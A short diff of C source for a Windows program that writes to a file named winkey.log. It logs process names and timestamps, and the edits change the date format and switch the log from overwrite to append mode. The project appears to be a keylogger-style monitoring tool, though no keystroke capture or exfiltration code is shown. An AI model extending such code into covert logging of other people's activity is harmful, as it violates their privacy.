@@ -28,7 +28,7 @@ void	AffProcessName(DWORD processID, const char *path)
 	struct tm t;
 	localtime_s(&t, &now);
 	char	buf[32];
-	strftime(buf, sizeof(buf), "[%d.%m.%Y %H:%M:%S]", &t);
+	strftime(buf, sizeof(buf), "[%d.%m. %Y %H:%M:%S]", &t);
 	fprintf(file, "\nTime : %s" ,buf);
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
 
@@ -169,7 +169,7 @@ int	create_file(const char *path) {
 	/*
 		crée le fichier winkey.log situ
 	*/
-	FILE *f = fopen(path, "w");
+	FILE *f = fopen(path, "a");
 	if (f == NULL)
 	{
 		perror("Can't create file");
